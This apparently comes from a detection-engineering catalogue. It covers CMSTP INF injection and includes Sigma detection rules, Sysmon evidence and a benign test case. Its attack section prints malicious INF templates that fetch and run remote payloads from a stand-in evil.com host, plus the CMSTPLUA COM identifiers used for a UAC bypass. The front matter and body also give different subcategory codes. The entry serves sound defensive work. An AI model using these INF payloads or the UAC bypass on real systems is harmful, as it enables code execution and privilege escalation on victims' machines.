---
id: ADE2-004
title: CMSTP INF Injection
ade_category: ADE2
ade_subcategory: ADE2-01
mitre_attack:
  - T1218.003 (System Binary Proxy Execution: CMSTP)
platform: Windows
testable: true
---

# CMSTP INF Injection

## Summary

CMSTP (Microsoft Connection Manager Profile Installer) processes INF files that can contain arbitrary commands in the `RunPreSetupCommandsSection`. By crafting a malicious INF file and executing it with `cmstp.exe /ni /s`, an attacker achieves code execution through a signed Microsoft binary. CMSTP can also bypass User Account Control (UAC) via the CMSTPLUA COM object, making it both an execution proxy and a privilege escalation tool. The payload lives entirely in the INF file, keeping the command line clean.

## ADE Classification

**Category:** ADE2 — Omit Alternatives
**Subcategory:** ADE2-02 — Alternative Code Execution
**Core principle:** Rules focused on known execution proxies (rundll32, regsvr32, mshta) miss CMSTP, a lesser-known signed binary that executes arbitrary commands from INF file configuration sections.

## The Technique

CMSTP.exe installs Connection Manager service profiles, which are used for VPN and dial-up configurations. The profile installer processes INF (setup information) files that support a `RunPreSetupCommandsSection` — a list of commands executed before the profile is installed.

### The canonical attack

```cmd
cmstp.exe /ni /s C:\Users\Public\evil.inf
```

| Flag | Purpose |
|------|---------|
| `/ni` | Install without creating a desktop shortcut |
| `/s` | Silent — suppress all UI dialogs |

### Malicious INF structure

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http://evil.com/payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="EvilProfile"
ShortSvcName="EvilProfile"
```

Alternative payload via `RunPreSetupCommandsSection`:

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
powershell.exe -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
taskkill /IM cmstp.exe /F
```

The `taskkill /IM cmstp.exe` at the end is characteristic — it kills the CMSTP process to prevent the Connection Manager UI from appearing, since the attacker only wanted the `RunPreSetupCommands` execution.

### UAC bypass via CMSTPLUA COM object

CMSTP can bypass UAC by instantiating the CMSTPLUA COM object, which has auto-elevation privileges:

```
CLSID: {3E5FC7F9-9A51-4367-9063-A120244FBEC7}
Interface: ICMLuaUtil
Method: ShellExec
```

This allows an attacker to execute arbitrary commands with elevated privileges without triggering a UAC prompt, provided the current user is in the Administrators group.

**OriginalFileName:** `CMSTP.EXE` (Sysmon strips the `.MUI` suffix — see NUANCES #4)

## Bypass Demonstration

### Benign test payload

Create `C:\Users\Public\test.inf`:

```ini
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
cmd.exe /c echo "CMSTP benign test" > C:\Users\Public\cmstp_test.txt
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM","SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="TestProfile"
ShortSvcName="TestProfile"
```

Execute:

```cmd
cmstp.exe /ni /s C:\Users\Public\test.inf
type C:\Users\Public\cmstp_test.txt
del C:\Users\Public\test.inf C:\Users\Public\cmstp_test.txt
```

### What the parser sees vs. what the rule sees

| Layer | Sees |
|-------|------|
| Sysmon EID 1 (cmstp.exe) | `cmstp.exe /ni /s C:\Users\Public\test.inf` — clean command line, payload in INF |
| Sysmon EID 1 (child cmd.exe) | `cmd.exe /c echo "CMSTP benign test" > C:\Users\Public\cmstp_test.txt` — spawned by cmstp |
| Sysmon EID 1 (taskkill) | `taskkill /IM cmstp.exe /F` — characteristic self-kill |
| Sysmon EID 11 (FileCreate) | INF file creation (if dropped by attacker) |
| Script Block Logging (4104) | Only if RunPreSetupCommands launches PowerShell |

## Vulnerable Rule

```yaml
title: Suspicious Execution Proxy
status: experimental
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
    condition: selection
```

### Why it misses

The rule enumerates known execution proxy binaries but omits CMSTP. The ADE2 pattern: the rule covers the tools the defender has seen, but not the functionally equivalent alternative.

## Hardened Rule

```yaml
title: CMSTP INF Execution (Hardened)
status: experimental
description: |
    Detects cmstp.exe processing an INF file, which may contain
    arbitrary commands in the RunPreSetupCommandsSection. Any CMSTP
    execution outside of legitimate VPN profile deployment is suspicious.
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\cmstp.exe'
        - OriginalFileName: 'CMSTP.EXE'
    selection_inf:
        CommandLine|contains: '.inf'
    condition: selection_img and selection_inf
falsepositives:
    - Legitimate Connection Manager profile deployment (rare in modern environments)
    - Enterprise VPN client installation
level: high
---
title: CMSTP Spawning Child Process (Hardened)
status: experimental
description: |
    Detects CMSTP spawning any child process. The RunPreSetupCommandsSection
    in a malicious INF launches commands as children of cmstp.exe. CMSTP
    should never spawn shells or interpreters in normal operation.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\cmstp.exe'
    filter_legitimate:
        Image|endswith:
            - '\cmstp.exe'
            - '\cmmgr32.exe'
    condition: selection and not filter_legitimate
falsepositives:
    - None expected — CMSTP should not spawn arbitrary processes
level: critical
---
title: Taskkill Targeting CMSTP (Characteristic Pattern)
status: experimental
description: |
    Detects taskkill being used to kill cmstp.exe. This is a characteristic
    pattern in CMSTP INF injection attacks — the attacker includes
    'taskkill /IM cmstp.exe' in the INF to prevent the Connection Manager
    UI from appearing after the payload executes.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\taskkill.exe'
        CommandLine|contains|all:
            - 'cmstp'
    condition: selection
falsepositives:
    - Administrative scripts cleaning up hung CMSTP processes (very rare)
level: high
---
title: CMSTPLUA COM Object UAC Bypass
status: experimental
description: |
    Detects the CMSTPLUA COM object being instantiated for UAC bypass.
    Monitors for DllHost.exe loading the CMSTPLUA CLSID.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\DllHost.exe'
        CommandLine|contains: '{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'
    condition: selection
falsepositives:
    - Legitimate Connection Manager operations (extremely rare)
level: critical
```

## Sysmon Evidence

### Event ID 1 -- Process Create (cmstp.exe)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\cmstp.exe` | Signed Microsoft binary |
| CommandLine | `cmstp.exe /ni /s C:\Users\Public\test.inf` | Clean — payload in INF file |
| OriginalFileName | `CMSTP.EXE` | Sysmon strips `.MUI` suffix |
| ParentImage | `C:\Windows\System32\cmd.exe` | Parent process |

### Event ID 1 -- Child Process (from RunPreSetupCommands)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\cmd.exe` | Command from INF |
| CommandLine | `cmd.exe /c echo "CMSTP benign test" > C:\Users\Public\cmstp_test.txt` | Full command from INF section |
| ParentImage | `C:\Windows\System32\cmstp.exe` | CMSTP as parent — key signal |

### Event ID 1 -- Taskkill (characteristic self-kill)

| Field | Value | Note |
|-------|-------|------|
| Image | `C:\Windows\System32\taskkill.exe` | Self-kill utility |
| CommandLine | `taskkill /IM cmstp.exe /F` | Killing the parent CMSTP process |
| ParentImage | `C:\Windows\System32\cmstp.exe` | Spawned by the same CMSTP instance |

## Detection Layers

| Layer | Detects? | Why |
|-------|----------|-----|
| Known execution proxy list (without CMSTP) | No | CMSTP not included in enumeration |
| CMSTP Image/OriginalFileName | Yes | Identifies any CMSTP execution |
| CMSTP CommandLine (.inf reference) | Yes | Confirms INF processing |
| CMSTP child process monitoring | Yes | RunPreSetupCommands children have ParentImage = cmstp.exe |
| taskkill targeting cmstp | Yes | Characteristic self-kill pattern |
| CMSTPLUA CLSID in DllHost | Yes | Catches UAC bypass variant |
| Script Block Logging (4104) | Partial | Only if RunPreSetupCommands launches PowerShell |
| AMSI | Partial | Only intercepts script content, not native commands |

## Known APT Usage

| Threat Actor | Context |
|-------------|---------|
| Cobalt Group | Used CMSTP for payload execution and UAC bypass in banking sector attacks |
| MuddyWater | Employed CMSTP INF injection in Middle East-focused espionage campaigns |
| LockBit 3.0 | Leveraged CMSTP for execution during ransomware deployment |

## Implementation Nuances

- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #4: Sysmon strips `.MUI` from OriginalFileName — `CMSTP.EXE` is logged, not `CMSTP.EXE.MUI`
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #2: Sysmon CommandLine is raw — the CMSTP command line is clean, but the child process command lines reveal the actual payload
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #11: OriginalFileName survives binary copy/rename — catches CMSTP copies placed in attacker-controlled directories
- See [Implementation Nuances](../../../bug_patterns/logging_assumption_errors.md) #6: Correlation timeframes — the child process and taskkill events occur within seconds of the CMSTP execution; tight timeframes (10-15s) are safe for correlation

## References

- [LOLBAS - Cmstp.exe](https://lolbas-project.github.io/lolbas/Binaries/Cmstp/)
- [MITRE ATT&CK T1218.003 - CMSTP](https://attack.mitre.org/techniques/T1218/003/)
- [Atomic Red Team - T1218.003](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md)
- [Oddvar Moe - CMSTP UAC Bypass](https://oddvar.moe/2017/08/15/research-on-cmstp-exe/)
- [NickTyrer - CMSTP Research](https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80)
- [Microsoft - CMSTP.exe Documentation](https://learn.microsoft.com/en-us/windows-server/networking/technologies/connection-manager/cmstp-exe)
